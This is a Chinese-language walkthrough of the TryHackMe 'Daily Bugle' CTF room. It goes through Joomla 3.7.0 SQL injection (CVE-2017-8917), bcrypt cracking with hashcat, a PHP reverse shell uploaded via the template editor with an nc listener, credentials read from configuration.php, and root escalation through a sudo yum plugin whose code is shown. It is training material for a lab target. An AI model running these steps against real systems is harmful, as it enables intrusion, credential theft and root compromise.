title: Daily Bugle CTF - TryHackMe.com
content:
Daily Bugle:通过SQLi入侵Joomla的CMS帐户，破解哈希密码并利用yum提权。

信息收集

开启靶机，使用nmap搜集服务信息。

nmap 扫描服务 

└─$ sudo nmap 10.10.62.61 -sV -F -T4 -oA dailynugle
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-24 10:22 EDT
Nmap scan report for 10.10.62.61
Host is up (0.45s latency).
Not shown: 97 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds

靶机上运行了http、mariaDB服务,我们首先从http服务开始入手搜索信息。

在首页上存在登录表单，尝试使用admin' or 1=1 -- #注入，无法成功，在页面上也找不到其他有用的信息。我们继续使用gobuster枚举该服务的目录。

gouster 枚举目录 

└─$ gobuster dir -u http://10.10.62.61 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.61
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/24 10:35:38 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/administrator        (Status: 301) [Size: 241] [--> http://10.10.62.61/administrator/]
/bin                  (Status: 301) [Size: 231] [--> http://10.10.62.61/bin/]
/cache                (Status: 301) [Size: 233] [--> http://10.10.62.61/cache/]
/cgi-bin/             (Status: 403) [Size: 210]
/components           (Status: 301) [Size: 238] [--> http://10.10.62.61/components/]
Progress: 1475 / 4615 (31.96%)                                                        [ERROR] 2022/04/24 10:37:03 [!] Get "http://10.10.62.61/dm-config": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/images               (Status: 301) [Size: 234] [--> http://10.10.62.61/images/]
/includes             (Status: 301) [Size: 236] [--> http://10.10.62.61/includes/]
Progress: 2034 / 4615 (44.07%)                                                        [ERROR] 2022/04/24 10:37:33 [!] Get "http://10.10.62.61/handlers": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/index.php            (Status: 200) [Size: 9276]
/language             (Status: 301) [Size: 236] [--> http://10.10.62.61/language/]
/layouts              (Status: 301) [Size: 235] [--> http://10.10.62.61/layouts/]
/libraries            (Status: 301) [Size: 237] [--> http://10.10.62.61/libraries/]
/media                (Status: 301) [Size: 233] [--> http://10.10.62.61/media/]
/modules              (Status: 301) [Size: 235] [--> http://10.10.62.61/modules/]
Progress: 2725 / 4615 (59.05%)                                                        [ERROR] 2022/04/24 10:38:16 [!] Get "http://10.10.62.61/mp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/plugins              (Status: 301) [Size: 235] [--> http://10.10.62.61/plugins/]
/robots.txt           (Status: 200) [Size: 836]
/templates            (Status: 301) [Size: 237] [--> http://10.10.62.61/templates/]
Progress: 4025 / 4615 (87.22%)                                                        [ERROR] 2022/04/24 10:39:33 [!] Get "http://10.10.62.61/styles": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/tmp                  (Status: 301) [Size: 231] [--> http://10.10.62.61/tmp/]
Progress: 4606 / 4615 (99.80%)                                                        [ERROR] 2022/04/24 10:40:11 [!] Get "http://10.10.62.61/who": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

===============================================================
2022/04/24 10:40:16 Finished
===============================================================

打开枚举到的目录/administrator,发现该服务使用的是JoomlaCMS。网络上搜索Joomla CVE,发现这个开源CMS存在很多可以利用的漏洞，但是首要一点是需要确认当前CMS的版本信息后，才能加以利用。

漏洞利用

在Github发现了一个可以利用的CMS检测工具CMSeeK,通过检测得知当前Joomla的版本为3.7.0。通过搜索Joomla 3.7.0 exploit发现这个版本的服务存在SQL注入漏洞。并且还找到了CVE-2017-8917注入脚本。

CVE-2017-891注入 


└─$ python3 cve20178917.py
     _                           _           ____ __     __ _____
    | |  ___    ___   _ __ ___  | |  __ _   / ___|\ \   / /| ____|
 _  | | / _ \  / _ \ | '_ ` _ \ | | / _` | | |     \ \ / / |  _|
| |_| || (_) || (_) || | | | | || || (_| | | |___   \ V /  | |___
 \___/  \___/  \___/ |_| |_| |_||_| \__,_|  \____|   \_/   |_____|


--- Version : Joomla 3.7.0 ---
--- Date : 05/27/2021 ---
--- CVE : CVE-2017-8917 ---
--- Exploit Author : SiopySh <contact@siopysh.com> - Twitter @siopysh ---

URL (ex: http://10.10.10.10/) :  http://10.10.62.61/

* Database prefix : fb9j5
* Joomla user : jonah
* Joomla user mail : jonah@tryhackme.com
* Joomla user password : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
* Database user : root@localhost
* Database name : joomla
* Database version : 5.5.64-MariaDB

注入结果显示了当前用户名和密码还有数据库版本信息等，其中用户密码使用的是Bcrypt加密算法。使用hashcat进行暴力破解。

John 密码解密 

└─$ hashcat -a 3 -m 3200 hash.txt /usr/share/wordlist/rockyou.txt
...
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Sun Apr 24 14:01:10 2022, (50 secs)
Time.Estimated...: Sun Apr 24 14:02:00 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: Pipe
Speed.#1.........:       37 H/s (3.32ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1836
Rejected.........: 0
Restore.Point....: 0
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: stargatesg1 -> spiderman123
Hardware.Mon.#1..: Util: 93%
Options Short / Long Type Description Example
-m, –hash-type Num Hash-type, references below (otherwise autodetect) -m 1000
-a, –attack-mode Num Attack-mode, see references below -a 3

使用用户名和解密后的密码登录JoomlaCMS系统。

经过一番挖掘，我们发现 可以将反向shell上传到靶机服务器。

上传反向shell

1.进入Extensions模块:Extensions -> Templates -> Templates

2.点击第二个模板链接：Protostar Details and Files

3.然后选择New File,创建php文件

4.上传反向shell代码

开启nc监听，并在浏览器上输入http://10.10.62.61/templates/protostar/reverse_nc.php,最终拿到反向Shell会话。

获取到反向shell会话 

└─$ rlwrap nc -lvnp 4242
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.105.225.
Ncat: Connection from 10.10.105.225:57710.
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:03:25 up 39 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$

使用whoami查看当前用户为apache,并没有登录权限。查看/home目录发现存在另一个用户jjameson,但是我们并没有这个用户的密码。继续挖掘，我们知道默认的apache文件路径一般为/var/www/html，我们去这个目录下看看有没有可以利用的信息。

ls /var/www/html 

ls -l /var/www/html
total 60
-rwxr-xr-x.  1 apache apache 18092 Apr 25  2017 LICENSE.txt
-rwxr-xr-x.  1 apache apache  4494 Apr 25  2017 README.txt
drwxr-xr-x. 11 apache apache   159 Apr 25  2017 administrator
drwxr-xr-x.  2 apache apache    44 Apr 25  2017 bin
drwxr-xr-x.  2 apache apache    24 Apr 25  2017 cache
drwxr-xr-x.  2 apache apache   119 Apr 25  2017 cli
drwxr-xr-x. 19 apache apache  4096 Apr 25  2017 components
-rw-r--r--   1 apache apache  1982 Dec 14  2019 configuration.php
-rwxr-xr-x.  1 apache apache  3005 Apr 25  2017 htaccess.txt
drwxr-xr-x.  5 apache apache   164 Dec 15  2019 images
drwxr-xr-x.  2 apache apache    64 Apr 25  2017 includes
-rwxr-xr-x.  1 apache apache  1420 Apr 25  2017 index.php
drwxr-xr-x.  4 apache apache    54 Apr 25  2017 language
drwxr-xr-x.  5 apache apache    70 Apr 25  2017 layouts
drwxr-xr-x. 11 apache apache   255 Apr 25  2017 libraries
drwxr-xr-x. 26 apache apache  4096 Apr 25  2017 media
drwxr-xr-x. 27 apache apache  4096 Apr 25  2017 modules
drwxr-xr-x. 16 apache apache   250 Apr 25  2017 plugins
-rwxr-xr-x.  1 apache apache   836 Apr 25  2017 robots.txt
drwxr-xr-x.  5 apache apache    68 Dec 15  2019 templates
drwxr-xr-x.  2 apache apache    24 Dec 15  2019 tmp
-rwxr-xr-x.  1 apache apache  1690 Apr 25  2017 web.config.txt

/var/www/html下的configuration.php引起了我的注意，这个文件用于配置Joomla，其中包括数据库用户名和密码等内容。

cat configuration.php 

cat /var/www/html/configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}

public $password = 'nv5uz9r3ZEDzVjNu'即为MariaDB服务的密码。

另人意外的是，这个密码同样也是Joomla的登录密码(这提醒我们使用重复的密码是很危险….),所以我们现在可以使用Joomla身份登录。

└─$ ssh jjameson@10.10.105.225
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$

权限提升

像往常一样，我们要尝试的第一件事是获取允许以sudo运行的命令列表命令。

sudo -l 

[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

jjameson用户使用sudo运行yum命令，它是获取、安装、删除、查询和管理 Red Hat Enterprise Linux RPM软件包的主要工具。使用GTFOBins搜索yum。

将(b)复制到jjameson的会话中，运行即可获取root权限。

yum提权 

[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2#

使用工具

  • Namp
  • MetaSploit
  • gobuster
  • CMSeeK
  • Hashid
  • Hashcat
  • linPEAS
  • GTFOBins

参考文档

  • Joomla! Component Fields - SQLi Remote Code Execution (Metasploit)
  • SQL Injection Vulnerability in Joomla! 3.7
  • hashcat VS john
  • 密码学系列之:bcrypt加密算法详解
